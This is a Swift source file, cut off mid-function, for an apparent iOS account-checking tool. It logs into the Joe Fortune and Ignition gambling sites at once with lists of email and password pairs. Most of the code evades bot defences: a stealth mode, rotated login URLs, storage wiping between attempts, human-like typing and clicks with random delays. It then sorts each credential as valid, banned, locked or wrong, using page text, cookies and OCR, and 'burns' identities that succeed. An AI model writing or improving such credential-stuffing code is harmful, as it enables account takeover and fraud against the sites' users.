import Foundation
import UIKit
import Vision
import WebKit

@MainActor
class DualSiteWorkerService {
    static let shared = DualSiteWorkerService()

    private let logger = DebugLogger.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let notifications = PPSRNotificationService.shared
    private let blacklistService = BlacklistService.shared
    private let urlRotation = LoginURLRotationService.shared
    private let crashProtection = CrashProtectionService.shared
    private let screenshotManager = UnifiedScreenshotManager.shared
    private let visionOCR = VisionTextCropService.shared
    private let coordEngine = CoordinateInteractionEngine.shared
    private let typingEngine = HardwareTypingEngine.shared
    private let settlementGate = SettlementGateEngine.shared

    struct WorkerResult {
        let session: DualSiteSession
        let joeOutcome: LoginOutcome?
        let ignitionOutcome: LoginOutcome?
        let pairedOCRStatus: String?
    }

    func runDualSiteSession(
        session: inout DualSiteSession,
        config: UnifiedSystemConfig,
        stealthEnabled: Bool,
        automationSettings: AutomationSettings = AutomationSettings(),
        onUpdate: @escaping (DualSiteSession) -> Void,
        onLog: @escaping (String, PPSRLogEntry.Level) -> Void
    ) async -> WorkerResult {
        let sessionId = "v42_\(session.credential.email.prefix(10))_\(UUID().uuidString.prefix(6))"
        let earlyStop = EarlyStopActor()

        onLog("V4.2 Worker \(sessionId): starting dual-site test for \(session.credential.email)", .info)

        session.currentAttempt = 0
        session.onlyIncorrectPassword = true
        onUpdate(session)

        let netConfig = networkFactory.appWideConfig(for: .joe)

        let joeSession = LoginSiteWebSession(
            targetURL: URL(string: resolveURL(for: .joefortune).absoluteString)!,
            networkConfig: netConfig,
            credentialId: session.credential.email
        )
        let ignSession = LoginSiteWebSession(
            targetURL: URL(string: resolveURL(for: .ignition).absoluteString)!,
            networkConfig: netConfig,
            credentialId: session.credential.email
        )

        joeSession.stealthEnabled = stealthEnabled
        ignSession.stealthEnabled = stealthEnabled

        await joeSession.setUp(wipeAll: true)
        await ignSession.setUp(wipeAll: true)

        if let joeWV = joeSession.webView, let ignWV = ignSession.webView {
            LiveWebViewDebugService.shared.registerPair(
                joeWebViewID: joeSession.poolSessionId,
                joeWebView: joeWV,
                ignWebViewID: ignSession.poolSessionId,
                ignWebView: ignWV,
                credentialEmail: session.credential.email,
                sessionIndex: session.currentAttempt,
                startedAt: session.startTime
            )
        }

        defer {
            joeSession.tearDown(wipeAll: true)
            ignSession.tearDown(wipeAll: true)
        }

        onLog("V4.2: Navigating both sites in parallel...", .info)
        async let joeLoadTask = joeSession.loadPage(timeout: automationSettings.pageLoadTimeout)
        async let ignLoadTask = ignSession.loadPage(timeout: automationSettings.pageLoadTimeout)
        let joeLoaded = await joeLoadTask
        let ignLoaded = await ignLoadTask

        if !joeLoaded && !ignLoaded {
            onLog("V4.2: Both sites failed to load — connection failure", .error)
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.endTime = Date()
            session.joeSiteResult = .noAccount
            session.ignitionSiteResult = .noAccount
            onUpdate(session)
            return WorkerResult(session: session, joeOutcome: .connectionFailure, ignitionOutcome: .connectionFailure, pairedOCRStatus: nil)
        }

        let joeSite = SiteTarget.joefortune
        let ignSite = SiteTarget.ignition

        let joeLoginBtnSelectors = [joeSite.selectors.submit, "button[type='submit']", "input[type='submit']"]
        let ignLoginBtnSelectors = [ignSite.selectors.submit, "button[type='submit']", "input[type='submit']"]

        async let joeStable: Void = {
            guard joeLoaded else { return }
            _ = await self.coordEngine.waitForButtonStable(selectors: joeLoginBtnSelectors, executeJS: { js in await joeSession.executeJS(js) }, stabilityMs: 300, timeoutMs: 5000, sessionId: sessionId)
        }()
        async let ignStable: Void = {
            guard ignLoaded else { return }
            _ = await self.coordEngine.waitForButtonStable(selectors: ignLoginBtnSelectors, executeJS: { js in await ignSession.executeJS(js) }, stabilityMs: 300, timeoutMs: 5000, sessionId: sessionId)
        }()
        _ = await (joeStable, ignStable)

        let initDelayMs = GaussianRandom.delay(minMs: 0, maxMs: 6000)
        onLog("V4.2: Initialization delay \(initDelayMs)ms", .info)
        try? await Task.sleep(for: .milliseconds(initDelayMs))

        var lastJoeOutcome: LoginOutcome?
        var lastIgnOutcome: LoginOutcome?

        for attemptNum in 1...config.maxAttemptsPerSite {
            guard await earlyStop.isActive else { break }
            guard !Task.isCancelled else { break }

            session.currentAttempt = attemptNum
            onUpdate(session)
            onLog("V4.2: Attempt \(attemptNum)/\(config.maxAttemptsPerSite)", .info)

            if attemptNum > 1 {
                let minDelayMs = Int(automationSettings.v42InterAttemptDelayMinSec * 1000)
                let maxDelayMs = Int(automationSettings.v42InterAttemptDelayMaxSec * 1000)
                let thinkDelayMs = GaussianRandom.delay(minMs: minDelayMs, maxMs: maxDelayMs)
                onLog("V4.2: Inter-attempt delay \(String(format: "%.1f", Double(thinkDelayMs) / 1000.0))s (Gaussian)", .info)
                try? await Task.sleep(for: .milliseconds(thinkDelayMs))
                guard await earlyStop.isActive else { break }

                if automationSettings.clearCookiesBetweenAttempts || automationSettings.clearLocalStorageBetweenAttempts || automationSettings.clearSessionStorageBetweenAttempts {
                    onLog("V4.2: Clearing data between attempts (cookies:\(automationSettings.clearCookiesBetweenAttempts) localStorage:\(automationSettings.clearLocalStorageBetweenAttempts) sessionStorage:\(automationSettings.clearSessionStorageBetweenAttempts))", .info)

                    // When cookies need clearing, use WKWebsiteDataStore APIs via setUp(wipeAll:)
                    // since document.cookie cannot see or delete HttpOnly cookies
                    if automationSettings.clearCookiesBetweenAttempts {
                        await joeSession.setUp(wipeAll: true)
                        await ignSession.setUp(wipeAll: true)
                        async let joeReload = joeSession.loadPage(timeout: automationSettings.pageLoadTimeout)
                        async let ignReload = ignSession.loadPage(timeout: automationSettings.pageLoadTimeout)
                        let _ = await (joeReload, ignReload)
                    } else {
                        // Only localStorage/sessionStorage clearing requested — JS is sufficient
                        var clearJS = "(function(){"
                        if automationSettings.clearLocalStorageBetweenAttempts { clearJS += "try{localStorage.clear();}catch(e){}" }
                        if automationSettings.clearSessionStorageBetweenAttempts { clearJS += "try{sessionStorage.clear();}catch(e){}" }
                        clearJS += "return'CLEARED';})()"
                        let joeExec: (String) async -> String? = { js in await joeSession.executeJS(js) }
                        let ignExec: (String) async -> String? = { js in await ignSession.executeJS(js) }
                        _ = await joeExec(clearJS)
                        _ = await ignExec(clearJS)
                    }
                }
            }

            async let joeNetIdle: Bool = self.coordEngine.checkNetworkIdle(executeJS: { js in await joeSession.executeJS(js) }, timeoutMs: 3000)
            async let ignNetIdle: Bool = self.coordEngine.checkNetworkIdle(executeJS: { js in await ignSession.executeJS(js) }, timeoutMs: 3000)
            _ = await (joeNetIdle, ignNetIdle)

            try? await Task.sleep(for: .milliseconds(GaussianRandom.delay(minMs: automationSettings.v42HumanVarianceMinMs, maxMs: automationSettings.v42HumanVarianceMaxMs)))

            async let joePreClickTask = self.settlementGate.capturePreClickFingerprint(
                executeJS: { js in await joeSession.executeJS(js) },
                sessionId: sessionId
            )
            async let ignPreClickTask = self.settlementGate.capturePreClickFingerprint(
                executeJS: { js in await ignSession.executeJS(js) },
                sessionId: sessionId
            )
            let joePreClick = await joePreClickTask
            let ignPreClick = await ignPreClickTask

            let email = session.credential.email
            let password = session.credential.password

            let joeEmailSelectors = [joeSite.selectors.user, "input[type='email']", "input[name='email']", "input[name='username']", "input[type='text']:first-of-type"]
            let joePassSelectors = [joeSite.selectors.pass, "input[type='password']", "input[name='password']"]
            let ignEmailSelectors = [ignSite.selectors.user, "input[type='email']", "input[name='email']", "input[name='username']", "input[type='text']:first-of-type"]
            let ignPassSelectors = [ignSite.selectors.pass, "input[type='password']", "input[name='password']"]

            let joeExecuteJS: @Sendable (String) async -> String? = { js in await joeSession.executeJS(js) }
            let ignExecuteJS: @Sendable (String) async -> String? = { js in await ignSession.executeJS(js) }

            let typingMinMs = config.humanEmulation.typingSpeedMin
            let typingMaxMs = config.humanEmulation.typingSpeedMax
            let varianceMinMs = automationSettings.v42HumanVarianceMinMs
            let varianceMaxMs = automationSettings.v42HumanVarianceMaxMs
            let fieldClearMethod = automationSettings.clearFieldsBeforeTyping ? automationSettings.clearFieldMethod : .jsValueClear

            async let joeTypingDone: Bool = {
                guard joeLoaded else { return false }
                let emailOk = await self.typingEngine.focusAndType(
                    fieldSelectors: joeEmailSelectors,
                    text: email,
                    executeJS: joeExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                try? await Task.sleep(for: .milliseconds(GaussianRandom.delay(minMs: varianceMinMs, maxMs: varianceMaxMs)))
                let passOk = await self.typingEngine.focusAndType(
                    fieldSelectors: joePassSelectors,
                    text: password,
                    executeJS: joeExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                return emailOk && passOk
            }()

            async let ignTypingDone: Bool = {
                guard ignLoaded else { return false }
                let emailOk = await self.typingEngine.focusAndType(
                    fieldSelectors: ignEmailSelectors,
                    text: email,
                    executeJS: ignExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                try? await Task.sleep(for: .milliseconds(GaussianRandom.delay(minMs: varianceMinMs, maxMs: varianceMaxMs)))
                let passOk = await self.typingEngine.focusAndType(
                    fieldSelectors: ignPassSelectors,
                    text: password,
                    executeJS: ignExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                return emailOk && passOk
            }()

            let joeTyped = await joeTypingDone
            let ignTyped = await ignTypingDone

            onLog("V4.2: Typing complete — Joe:\(joeTyped) Ign:\(ignTyped)", joeTyped && ignTyped ? .success : .warning)

            try? await Task.sleep(for: .milliseconds(GaussianRandom.delay(minMs: automationSettings.v42HumanVarianceMinMs, maxMs: automationSettings.v42HumanVarianceMaxMs)))

            guard await earlyStop.isActive else { break }

            async let joeClicked: Bool = {
                guard joeLoaded && joeTyped else { return false }
                let result = await self.coordEngine.coordinateClickWithFallback(
                    primarySelectors: joeLoginBtnSelectors,
                    fallbackSelectors: ["button", "[role='button']"],
                    executeJS: joeExecuteJS,
                    jitterPx: 3,
                    hoverDwellMs: 300,
                    sessionId: sessionId
                )
                return result.success
            }()

            async let ignClicked: Bool = {
                guard ignLoaded && ignTyped else { return false }
                let result = await self.coordEngine.coordinateClickWithFallback(
                    primarySelectors: ignLoginBtnSelectors,
                    fallbackSelectors: ["button", "[role='button']"],
                    executeJS: ignExecuteJS,
                    jitterPx: 3,
                    hoverDwellMs: 300,
                    sessionId: sessionId
                )
                return result.success
            }()

            let joeClickOk = await joeClicked
            let ignClickOk = await ignClicked

            onLog("V4.2: Click complete — Joe:\(joeClickOk) Ign:\(ignClickOk)", joeClickOk || ignClickOk ? .info : .warning)

            let joeURL = joeSession.targetURL.absoluteString
            let ignURL = ignSession.targetURL.absoluteString

            async let joeSettlement: SettlementGateEngine.SettlementResult? = {
                guard let joeFingerprint = joePreClick, joeClickOk else { return nil }
                return await self.settlementGate.waitForSettlement(
                    originalFingerprint: joeFingerprint,
                    executeJS: joeExecuteJS,
                    maxTimeoutMs: 15000,
                    preClickURL: joeURL,
                    sessionId: sessionId
                )
            }()
            async let ignSettlement: SettlementGateEngine.SettlementResult? = {
                guard let ignFingerprint = ignPreClick, ignClickOk else { return nil }
                return await self.settlementGate.waitForSettlement(
                    originalFingerprint: ignFingerprint,
                    executeJS: ignExecuteJS,
                    maxTimeoutMs: 15000,
                    preClickURL: ignURL,
                    sessionId: sessionId
                )
            }()
            let (joeSettleResult, ignSettleResult) = await (joeSettlement, ignSettlement)
            if let js = joeSettleResult {
                onLog("V4.2 JOE settlement: \(js.reason) (\(js.durationMs)ms)", js.settled ? .success : .warning)
            }
            if let is_ = ignSettleResult {
                onLog("V4.2 IGN settlement: \(is_.reason) (\(is_.durationMs)ms)", is_.settled ? .success : .warning)
            }

            let ssLimit = automationSettings.unifiedScreenshotsPerAttempt
            if ssLimit != .zero {
                let postClickDelay = automationSettings.unifiedScreenshotPostClickDelayMs
                let clickPriority = AutomationSettings.UnifiedScreenshotCount.priorityOrder(
                    forClickIndex: attemptNum - 1,
                    totalClicks: config.maxAttemptsPerSite
                )
                try? await Task.sleep(for: .milliseconds(postClickDelay))
                await capturePostClickScreenshots(
                    joeSession: joeSession,
                    ignSession: ignSession,
                    sessionId: session.id,
                    email: session.credential.email,
                    attemptNum: attemptNum,
                    clickPriority: clickPriority,
                    joeClickOk: joeClickOk,
                    ignClickOk: ignClickOk,
                    perSiteLimit: ssLimit.perCredentialPerSiteLimit
                )
                onLog("V4.2: Post-click screenshot captured (priority \(clickPriority), delay \(postClickDelay)ms)", .info)
            }

            try? await Task.sleep(for: .milliseconds(GaussianRandom.delay(minMs: automationSettings.v42HumanVarianceMinMs, maxMs: automationSettings.v42HumanVarianceMaxMs)))

            async let joeOutcomeTask = self.evaluateSiteStrict(
                session: joeSession,
                site: "joe",
                attemptNum: attemptNum,
                maxAttempts: config.maxAttemptsPerSite,
                settlementResult: joeSettleResult,
                automationSettings: automationSettings,
                sessionId: sessionId
            )
            async let ignOutcomeTask = self.evaluateSiteStrict(
                session: ignSession,
                site: "ignition",
                attemptNum: attemptNum,
                maxAttempts: config.maxAttemptsPerSite,
                settlementResult: ignSettleResult,
                automationSettings: automationSettings,
                sessionId: sessionId
            )
            let joeOutcome = await joeOutcomeTask
            let ignOutcome = await ignOutcomeTask

            lastJoeOutcome = joeOutcome
            lastIgnOutcome = ignOutcome

            let now = Date()
            session.joeAttempts.append(SiteAttemptResult(
                siteId: "joe",
                attemptNumber: attemptNum,
                responseText: describeOutcome(joeOutcome),
                timestamp: now,
                durationMs: 0
            ))
            session.ignitionAttempts.append(SiteAttemptResult(
                siteId: "ignition",
                attemptNumber: attemptNum,
                responseText: describeOutcome(ignOutcome),
                timestamp: now,
                durationMs: 0
            ))

            if joeOutcome != .noAcc { session.onlyIncorrectPassword = false }
            if ignOutcome != .noAcc { session.onlyIncorrectPassword = false }

            let joeRegistered = session.joeAttempts.count
            let ignRegistered = session.ignitionAttempts.count
            session.joeSiteResult = SiteResult.fromLoginOutcome(joeOutcome, registeredAttempts: joeRegistered, maxAttempts: config.maxAttemptsPerSite)
            session.ignitionSiteResult = SiteResult.fromLoginOutcome(ignOutcome, registeredAttempts: ignRegistered, maxAttempts: config.maxAttemptsPerSite)

            if joeOutcome == .success || ignOutcome == .success {
                let trigSite = joeOutcome == .success ? "joe" : "ignition"
                await earlyStop.signalSuccess(from: trigSite)
                session.globalState = .success
                session.classification = .validAccount
                session.identityAction = .burn
                session.isBurned = true
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: SUCCESS on \(trigSite) — burning identity", .success)
                notifications.sendBatchComplete(working: 1, dead: 0, requeued: 0)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .successDetected, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear SUCCESS result", .info)
                break
            }

            if joeOutcome == .permDisabled || ignOutcome == .permDisabled {
                let trigSite = joeOutcome == .permDisabled ? "joe" : "ignition"
                await earlyStop.signalPermBan(from: trigSite)
                session.globalState = .abortPerm
                session.classification = .permanentBan
                session.identityAction = .burn
                session.isBurned = true
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: PERM BAN on \(trigSite) — burning identity", .error)
                blacklistService.addToBlacklist(session.credential.email, reason: "V4.2: perm disabled")
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .terminalState, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear PERM BAN result", .info)
                break
            }

            if joeOutcome == .tempDisabled || ignOutcome == .tempDisabled {
                let trigSite = joeOutcome == .tempDisabled ? "joe" : "ignition"
                await earlyStop.signalTempLock(from: trigSite)
                session.globalState = .abortTemp
                session.classification = .temporaryLock
                session.identityAction = .save
                session.isBurned = false
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: TEMP LOCK on \(trigSite) — keeping identity", .warning)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .terminalState, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear TEMP LOCK result", .info)
                break
            }

            if attemptNum >= config.maxAttemptsPerSite {
                await earlyStop.signalExhausted()
                session.globalState = .exhausted
                session.classification = .noAccount
                session.identityAction = .save
                session.isBurned = false
                session.endTime = Date()
                onLog("V4.2: EXHAUSTED after \(attemptNum) attempts — \(session.onlyIncorrectPassword ? "only incorrect password" : "mixed responses")", .warning)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .finalState, session: &session)
                break
            }

            onLog("V4.2: Attempt \(attemptNum) — incorrect password, continuing...", .info)
            onUpdate(session)
        }

        let ssLimit = automationSettings.unifiedScreenshotsPerAttempt
        if ssLimit != .zero {
            screenshotManager.pruneByPriority(sessionId: session.id, limit: ssLimit.limit)
        }

        if session.globalState == .active {
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.isBurned = false
            session.endTime = Date()
            if session.joeSiteResult == .pending { session.joeSiteResult = .noAccount }
            if session.ignitionSiteResult == .pending { session.ignitionSiteResult = .noAccount }
        }

        onUpdate(session)
        return WorkerResult(session: session, joeOutcome: lastJoeOutcome, ignitionOutcome: lastIgnOutcome, pairedOCRStatus: session.pairedOCRStatus)
    }

    /// Shared keywords used by the 1-second DOM+OCR polling loop (Issue 1).
    private static let evalSuccessKeywords = ["recommended for you", "last played"]
    private static let evalPermDisabledKeywords = ["has been disabled"]
    private static let evalTempDisabledKeywords = ["temporarily disabled"]

    /// Maximum duration (seconds) for the bounded DOM+OCR polling loop before falling back.
    private static let evalPollMaxSeconds: Int = 30

    private func evaluateSiteStrict(
        session: LoginSiteWebSession,
        site: String,
        attemptNum _: Int,
        maxAttempts _: Int,
        settlementResult: SettlementGateEngine.SettlementResult?,
        automationSettings: AutomationSettings,
        sessionId: String
    ) async -> LoginOutcome {
        // Issue 14: Check for about:blank or very short content
        let currentURL = await session.getCurrentURL()
        if currentURL == "about:blank" || currentURL.isEmpty {
            logger.log("V4.2 EVAL [\(site)]: about:blank detected — returning .connectionFailure", category: .evaluation, level: .warning, sessionId: sessionId)
            return .connectionFailure
        }

        let initialContent = await session.getPageContent() ?? ""
        if initialContent.count < automationSettings.minimumPageContentLength {
            logger.log("V4.2 EVAL [\(site)]: page content too short (\(initialContent.count) chars, min \(automationSettings.minimumPageContentLength)) — returning .connectionFailure", category: .evaluation, level: .warning, sessionId: sessionId)
            return .connectionFailure
        }

        // Issue 9: If settlement already detected error text, use it immediately
        if let settlement = settlementResult, settlement.errorTextVisible {
            let contentLower = initialContent.lowercased()
            logger.log("V4.2 EVAL [\(site)]: settlement already detected error text in \(settlement.durationMs)ms", category: .evaluation, level: .info, sessionId: sessionId)
            if contentLower.contains("has been disabled") {
                return .permDisabled
            }
            if contentLower.contains("temporarily disabled") {
                return .tempDisabled
            }
            if contentLower.contains("incorrect") || contentLower.contains("invalid") || contentLower.contains("wrong") {
                return .noAcc
            }
        }

        // Issue 1: 1-second bounded DOM+OCR polling loop (max evalPollMaxSeconds)
        // DOM content is scanned every cycle; OCR runs on cycle 1, then every 3rd cycle.
        // P3 DOM check scans for "incorrect".
        let cookieJS = "(function(){try{return document.cookie||'';}catch(e){return '';}})()"
        let pollStart = Date()
        var pollCycle = 0

        while !Task.isCancelled && Date().timeIntervalSince(pollStart) < Double(Self.evalPollMaxSeconds) {
            pollCycle += 1

            // --- DOM scan (every cycle) ---
            let domContent = (await session.getPageContent() ?? "").lowercased()

            // Issue 1 success keywords via DOM
            for keyword in Self.evalSuccessKeywords {
                if domContent.contains(keyword) {
                    logger.log("V4.2 EVAL [\(site)]: SUCCESS — DOM poll cycle \(pollCycle) found '\(keyword)'", category: .evaluation, level: .success, sessionId: sessionId)
                    return .success
                }
            }

            // Issue 1 disabled keywords via DOM
            for keyword in Self.evalPermDisabledKeywords {
                if domContent.contains(keyword) {
                    logger.log("V4.2 EVAL [\(site)]: PERM_DISABLED — DOM poll cycle \(pollCycle) found '\(keyword)'", category: .evaluation, level: .critical, sessionId: sessionId)
                    return .permDisabled
                }
            }
            for keyword in Self.evalTempDisabledKeywords {
                if domContent.contains(keyword) {
                    logger.log("V4.2 EVAL [\(site)]: TEMP_DISABLED — DOM poll cycle \(pollCycle) found '\(keyword)'", category: .evaluation, level: .critical, sessionId: sessionId)
                    return .tempDisabled
                }
            }

            // P3 DOM check for "incorrect"
            if domContent.contains("incorrect") {
                logger.log("V4.2 EVAL [\(site)]: NO_ACC — DOM poll cycle \(pollCycle) found 'incorrect'", category: .evaluation, level: .info, sessionId: sessionId)
                return .noAcc
            }

            // Issue 3: Cookie-based success detection
            let cookies = (await session.executeJS(cookieJS) ?? "").lowercased()
            if cookies.contains("session_id") {
                logger.log("V4.2 EVAL [\(site)]: SUCCESS — session_id cookie detected on poll cycle \(pollCycle)", category: .evaluation, level: .success, sessionId: sessionId)
                return .success
            }

            // Issue 11: SMS notification keywords
            if automationSettings.smsDetectionEnabled {
                for keyword in automationSettings.smsNotificationKeywords {
                    if domContent.contains(keyword.lowercased()) {
                        logger.log("V4.2 EVAL [\(site)]: SMS detected — keyword '\(keyword)' on poll cycle \(pollCycle)", category: .evaluation, level: .warning, sessionId: sessionId)
                        return .smsDetected
                    }
                }
            }

            // --- OCR scan (first cycle + every 3rd cycle to limit Vision framework overhead) ---
            // Vision work is dispatched off the main actor to avoid blocking the UI.
            if pollCycle == 1 || pollCycle % 3 == 0, let screenshot = await session.captureScreenshot() {
                let ocrText = await performOCROffMain(screenshot)
                let ocrLower = ocrText.lowercased()

                for keyword in Self.evalSuccessKeywords {
                    if ocrLower.contains(keyword) {
                        logger.log("V4.2 EVAL [\(site)]: SUCCESS — OCR poll cycle \(pollCycle) found '\(keyword)'", category: .evaluation, level: .success, sessionId: sessionId)
                        return .success
                    }
                }
                for keyword in Self.evalPermDisabledKeywords {
                    if ocrLower.contains(keyword) {
                        logger.log("V4.2 EVAL [\(site)]: PERM_DISABLED — OCR poll cycle \(pollCycle) found '\(keyword)'", category: .evaluation, level: .critical, sessionId: sessionId)
                        return .permDisabled
                    }
                }
                for keyword in Self.evalTempDisabledKeywords {
                    if ocrLower.contains(keyword) {
                        logger.log("V4.2 EVAL [\(site)]: TEMP_DISABLED — OCR poll cycle \(pollCycle) found '\(keyword)'", category: .evaluation, level: .critical, sessionId: sessionId)
                        return .tempDisabled
                    }
                }
                if ocrLower.contains("incorrect") {
                    logger.log("V4.2 EVAL [\(site)]: NO_ACC — OCR poll cycle \(pollCycle) found 'incorrect'", category: .evaluation, level: .info, sessionId: sessionId)
                    return .noAcc
                }

                // Issue 11: SMS keywords via OCR (rendered in image/canvas, not present in DOM)
                if automationSettings.smsDetectionEnabled {
                    for keyword in automationSettings.smsNotificationKeywords {
                        if ocrLower.contains(keyword.lowercased()) {
                            logger.log("V4.2 EVAL [\(site)]: SMS detected — OCR keyword '\(keyword)' on poll cycle \(pollCycle)", category: .evaluation, level: .warning, sessionId: sessionId)
                            return .smsDetected
                        }
                    }
                }
            }

            // Wait 1 second before the next poll cycle
            try? await Task.sleep(for: .seconds(1))
        }

        // Polling exhausted without a definitive match — classify as noAcc
        logger.log("V4.2 EVAL [\(site)]: OCR polling exhausted — no keywords matched after \(pollCycle) cycles, classifying as .noAcc", category: .evaluation, level: .warning, sessionId: sessionId)
        return .noAcc
    }

    /// Performs Vision OCR text recognition off the main actor to avoid blocking the UI.
    nonisolated private func performOCROffMain(_ image: UIImage) async -> String {
        guard let cgImage = image.cgImage else { return "" }
        return await Task.detached(priority: .userInitiated) {
            let request = VNRecognizeTextRequest()
            request.recognitionLevel = .accurate
            request.recognitionLanguages = ["en-US"]
            request.usesLanguageCorrection = true
            let handler = VNImageRequestHandler(cgImage: cgImage, options: [:])
            do {
                try handler.perform([request])
            } catch {
                return ""
            }
            var parts: [String] = []
            for observation in request.results ?? [] {
                guard let candidate = observation.topCandidates(1).first else { continue }
                parts.append(candidate.string)
            }
            return parts.joined(separator: " ")
        }.value
    }

    private func resolveURL(for site: SiteTarget) -> URL {
        let isIgnition = site.id == "ignition"
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = isIgnition
        let url = urlRotation.nextURL() ?? URL(string: site.url)!
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    private func describeOutcome(_ outcome: LoginOutcome) -> String {
        switch outcome {
        case .success: "Login successful"
        case .permDisabled: "Account permanently disabled"
        case .tempDisabled: "Account temporarily disabled"
        case .noAcc: "Incorrect password"

        case .connectionFailure: "Connection failure"
        case .timeout: "Timed out"
        case .smsDetected: "SMS notification detected"
        }
    }

    struct TerminalScreenshotResult {
        let hasImage: Bool
        let ocrOutcome: String
        let crucialMatches: [String]
        let fullText: String
        let confidence: Double
    }

    private func captureTerminalScreenshots(
        joeSession: LoginSiteWebSession,
        ignSession: LoginSiteWebSession,
        sessionId: String,
        email: String,
        attemptNum: Int,
        step: ScreenshotStep,
        session: inout DualSiteSession
    ) async {
        let pairTimestamp = Date()

        async let joeCapture: TerminalScreenshotResult = {
            guard let img = await joeSession.captureScreenshot() else {
                return TerminalScreenshotResult(hasImage: false, ocrOutcome: "", crucialMatches: [], fullText: "", confidence: 0)
            }
            await self.screenshotManager.addScreenshotDirect(
                image: img,
                sessionId: sessionId,
                credentialEmail: email,
                site: "joe",
                step: step,
                attemptNumber: attemptNum,
                clickPriority: 0,
                runVisionAnalysis: true
            )
            let analysis = await self.visionOCR.analyzeScreenshot(img)
            return TerminalScreenshotResult(
                hasImage: true,
                ocrOutcome: analysis.detectedOutcome.pairedLabel,
                crucialMatches: analysis.crucialMatches,
                fullText: String(analysis.allText.prefix(2000)),
                confidence: analysis.confidence
            )
        }()

        async let ignCapture: TerminalScreenshotResult = {
            guard let img = await ignSession.captureScreenshot() else {
                return TerminalScreenshotResult(hasImage: false, ocrOutcome: "", crucialMatches: [], fullText: "", confidence: 0)
            }
            await self.screenshotManager.addScreenshotDirect(
                image: img,
                sessionId: sessionId,
                credentialEmail: email,
                site: "ignition",
                step: step,
                attemptNumber: attemptNum,
                clickPriority: 0,
                runVisionAnalysis: true
            )
            let analysis = await self.visionOCR.analyzeScreenshot(img)
            return TerminalScreenshotResult(
                hasImage: true,
                ocrOutcome: analysis.detectedOutcome.pairedLabel,
                crucialMatches: analysis.crucialMatches,
                fullText: String(analysis.allText.prefix(2000)),
                confidence: analysis.confidence
            )
        }()

        let (joeResult, ignResult) = await (joeCapture, ignCapture)

        if joeResult.hasImage {
            session.joeOCRMetadata = SiteOCRMetadata(
                siteId: "joe",
                ocrOutcome: joeResult.ocrOutcome,
                crucialMatches: joeResult.crucialMatches,
                fullText: joeResult.fullText,
                confidence: joeResult.confidence,
                screenshotTimestamp: pairTimestamp
            )
        }
        if ignResult.hasImage {
            session.ignitionOCRMetadata = SiteOCRMetadata(
                siteId: "ignition",
                ocrOutcome: ignResult.ocrOutcome,
                crucialMatches: ignResult.crucialMatches,
                fullText: ignResult.fullText,
                confidence: ignResult.confidence,
                screenshotTimestamp: pairTimestamp
            )
        }

        if let joeOCR = session.joeOCRMetadata, let ignOCR = session.ignitionOCRMetadata {
            let paired = VisionTextCropService.pairedOCRStatus(
                joe: ocrLabelToOutcome(joeOCR.ocrOutcome),
                ignition: ocrLabelToOutcome(ignOCR.ocrOutcome)
            )
            logger.log("V4.2 OCR Paired: \(email) → \(paired)", category: .evaluation, level: .info)
        }
    }

    private func capturePostClickScreenshots(
        joeSession: LoginSiteWebSession,
        ignSession: LoginSiteWebSession,
        sessionId: String,
        email: String,
        attemptNum: Int,
        clickPriority: Int,
        joeClickOk: Bool,
        ignClickOk: Bool,
        perSiteLimit: Int
    ) async {
        let canCaptureJoe = joeClickOk && screenshotManager.canCapture(credentialEmail: email, site: "joe", limit: perSiteLimit)
        let canCaptureIgn = ignClickOk && screenshotManager.canCapture(credentialEmail: email, site: "ignition", limit: perSiteLimit)

        if !canCaptureJoe && joeClickOk {
            logger.log("V4.2 Screenshot: joe limit reached (\(perSiteLimit)/site) for \(email)", category: .screenshot, level: .trace)
        }
        if !canCaptureIgn && ignClickOk {
            logger.log("V4.2 Screenshot: ignition limit reached (\(perSiteLimit)/site) for \(email)", category: .screenshot, level: .trace)
        }

        async let joeCaptureDone: Void = {
            guard canCaptureJoe, let joeImg = await joeSession.captureScreenshot() else { return }
            await self.screenshotManager.addScreenshotDirect(
                image: joeImg,
                sessionId: sessionId,
                credentialEmail: email,
                site: "joe",
                step: .postClick,
                attemptNumber: attemptNum,
                clickPriority: clickPriority,
                runVisionAnalysis: false
            )
        }()
        async let ignCaptureDone: Void = {
            guard canCaptureIgn, let ignImg = await ignSession.captureScreenshot() else { return }
            await self.screenshotManager.addScreenshotDirect(
                image: ignImg,
                sessionId: sessionId,
                credentialEmail: email,
                site: "ignition",
                step: .postClick,
                attemptNumber: attemptNum,
                clickPriority: clickPriority,
                runVisionAnalysis: false
            )
        }()
        _ = await (joeCaptureDone, ignCaptureDone)
    }

    private func ocrLabelToOutcome(_ label: String) -> VisionTextCropService.DetectedOutcome {
        switch label {
